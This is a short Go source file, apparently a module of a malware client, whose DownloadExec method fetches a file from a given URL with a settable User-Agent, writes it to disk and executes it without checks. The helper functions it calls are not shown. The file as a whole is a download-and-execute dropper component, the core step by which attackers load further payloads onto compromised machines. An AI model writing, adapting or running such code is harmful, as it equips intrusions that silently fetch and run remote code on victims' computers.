package downloader

import (
	"io/ioutil"
	"net/http"
)

// Define an HTTP Download struct that implements the Downloader interface.
type HttpDownload struct {
	agent string
}

// Download a file from the given URL using the given User Agent.
func (h *HttpDownload) DownloadExec(url string) {
	client := httpClient()
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return
	}

	req.Header.Set("User-Agent", h.agent)

	resp, err := client.Do(req)
	if err != nil {
		return
	}

	defer resp.Body.Close()
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}

	filename := save(data)
	run(filename)
}
